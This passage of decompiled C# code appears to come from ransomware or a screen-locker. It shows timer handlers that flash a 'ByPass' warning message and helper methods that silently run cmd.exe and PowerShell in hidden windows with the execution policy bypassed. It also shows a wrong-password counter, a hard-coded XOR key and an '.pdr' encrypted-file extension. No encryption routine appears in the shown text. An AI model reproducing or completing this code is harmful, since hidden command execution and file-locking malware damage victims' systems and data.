			gui.mouse_event(4, 0, 0, 3, 3);
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00004D00 File Offset: 0x00002F00
		private void method_12(object sender, EventArgs e)
		{
			ref object ptr = ref this.object_4;
			ptr = Operators.AddObject(ptr, 1);
			bool flag = Operators.ConditionalCompareObjectEqual(this.object_4, 1, false);
			if (flag)
			{
				this.method_10();
			}
			this.ByPassMessage.Visible = true;
			object obj = this.object_4;
			bool flag2 = Operators.ConditionalCompareObjectEqual(obj, 3, false);
			if (flag2)
			{
				this.ByPassWarnMsg.ForeColor = Color.HotPink;
				this.ByPassWarnMsg.BackColor = Color.Black;
			}
			else
			{
				bool flag3 = Operators.ConditionalCompareObjectEqual(obj, 5, false);
				if (flag3)
				{
					this.ByPassWarnMsg.ForeColor = Color.Magenta;
					this.ByPassWarnMsg.BackColor = Color.Black;
				}
				else
				{
					bool flag4 = Operators.ConditionalCompareObjectEqual(obj, 6, false);
					if (flag4)
					{
						this.ByPassWarnMsg.ForeColor = Color.HotPink;
						this.ByPassWarnMsg.BackColor = Color.Black;
					}
					else
					{
						bool flag5 = Operators.ConditionalCompareObjectEqual(obj, 7, false);
						if (flag5)
						{
							this.ByPassWarnMsg.ForeColor = Color.Magenta;
							this.ByPassWarnMsg.BackColor = Color.Black;
						}
						else
						{
							bool flag6 = Operators.ConditionalCompareObjectEqual(obj, 100, false);
							if (flag6)
							{
								this.ByPassMessage.Visible = false;
								this.vmethod_8().Stop();
								this.object_4 = 0;
							}
						}
					}
				}
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00002229 File Offset: 0x00000429
		private void method_13(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00002229 File Offset: 0x00000429
		private void method_14(object sender, EventArgs e)
		{
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00002229 File Offset: 0x00000429
		private void method_15(object sender, EventArgs e)
		{
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000063FC File Offset: 0x000045FC
		[CompilerGenerated]
		internal virtual global::System.Windows.Forms.Timer vmethod_0()
		{
			return this.timer_0;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00006414 File Offset: 0x00004614
		[CompilerGenerated]
		internal virtual void vmethod_1(global::System.Windows.Forms.Timer t)
		{
			EventHandler eventHandler = new EventHandler(this.method_0);
			bool flag = this.timer_0 != null;
			if (flag)
			{
				this.timer_0.Tick -= eventHandler;
			}
			this.timer_0 = t;
			bool flag2 = this.timer_0 != null;
			if (flag2)
			{
				this.timer_0.Tick += eventHandler;
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0000646C File Offset: 0x0000466C
		[CompilerGenerated]
		internal virtual global::System.Windows.Forms.Timer vmethod_2()
		{
			return this.timer_1;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00006484 File Offset: 0x00004684
		[CompilerGenerated]
		internal virtual void vmethod_3(global::System.Windows.Forms.Timer t)
		{
			EventHandler eventHandler = new EventHandler(this.method_1);
			bool flag = this.timer_1 != null;
			if (flag)
			{
				this.timer_1.Tick -= eventHandler;
			}
			this.timer_1 = t;
			bool flag2 = this.timer_1 != null;
			if (flag2)
			{
				this.timer_1.Tick += eventHandler;
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000064DC File Offset: 0x000046DC
		[CompilerGenerated]
		internal virtual global::System.Windows.Forms.Timer vmethod_4()
		{
			return this.timer_2;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x000064F4 File Offset: 0x000046F4
		[CompilerGenerated]
		internal virtual void vmethod_5(global::System.Windows.Forms.Timer t)
		{
			EventHandler eventHandler = new EventHandler(this.method_4);
			bool flag = this.timer_2 != null;
			if (flag)
			{
				this.timer_2.Tick -= eventHandler;
			}
			this.timer_2 = t;
			bool flag2 = this.timer_2 != null;
			if (flag2)
			{
				this.timer_2.Tick += eventHandler;
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x0000654C File Offset: 0x0000474C
		[CompilerGenerated]
		internal virtual global::System.Windows.Forms.Timer vmethod_6()
		{
			return this.timer_3;
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00006564 File Offset: 0x00004764
		[CompilerGenerated]
		internal virtual void vmethod_7(global::System.Windows.Forms.Timer t)
		{
			EventHandler eventHandler = new EventHandler(this.method_11);
			bool flag = this.timer_3 != null;
			if (flag)
			{
				this.timer_3.Tick -= eventHandler;
			}
			this.timer_3 = t;
			bool flag2 = this.timer_3 != null;
			if (flag2)
			{
				this.timer_3.Tick += eventHandler;
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x000065BC File Offset: 0x000047BC
		[CompilerGenerated]
		internal virtual global::System.Windows.Forms.Timer vmethod_8()
		{
			return this.timer_4;
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000065D4 File Offset: 0x000047D4
		[CompilerGenerated]
		internal virtual void vmethod_9(global::System.Windows.Forms.Timer t)
		{
			EventHandler eventHandler = new EventHandler(this.method_12);
			bool flag = this.timer_4 != null;
			if (flag)
			{
				this.timer_4.Tick -= eventHandler;
			}
			this.timer_4 = t;
			bool flag2 = this.timer_4 != null;
			if (flag2)
			{
				this.timer_4.Tick += eventHandler;
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x0000662C File Offset: 0x0000482C
		private void RunCmd(string args)
		{
			try
			{
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c " + args,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				if (process != null)
				{
					process.WaitForExit(10000);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600006E RID: 110 RVA: 0x0000669C File Offset: 0x0000489C
		private void RunPowerShell(string command)
		{
			try
			{
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = "powershell.exe",
					Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"" + command.Replace("\"", "`\"") + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				});
				if (process != null)
				{
					process.WaitForExit(15000);
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000016 RID: 22
		private static int wrongPasswordCount = 0;

		// Token: 0x04000017 RID: 23
		public string string_0;

		// Token: 0x04000018 RID: 24
		private object object_0;

		// Token: 0x04000019 RID: 25
		private object object_1;

		// Token: 0x0400001A RID: 26
		private object object_2;

		// Token: 0x0400001B RID: 27
		private object object_3;

		// Token: 0x0400001C RID: 28
		private object object_4;

		// Token: 0x0400001E RID: 30
		[CompilerGenerated]
		private Label label_12;

		// Token: 0x0400001F RID: 31
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer timer_0;

		// Token: 0x04000020 RID: 32
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer timer_1;

		// Token: 0x04000021 RID: 33
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer timer_2;

		// Token: 0x04000022 RID: 34
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer timer_3;

		// Token: 0x04000023 RID: 35
		[CompilerGenerated]
		private global::System.Windows.Forms.Timer timer_4;

		// Token: 0x04000024 RID: 36
		private static readonly byte[] XOR_KEY = new byte[] { 19, 55, 222, 173 };

		// Token: 0x04000025 RID: 37
		private const string ENCRYPTED_EXT = ".pdr";

		// Token: 0x04000026 RID: 38
		private int bypass_attempts = 0;

		// Token: 0x04000047 RID: 71
		private static bool stopAudio = false;
	}
}
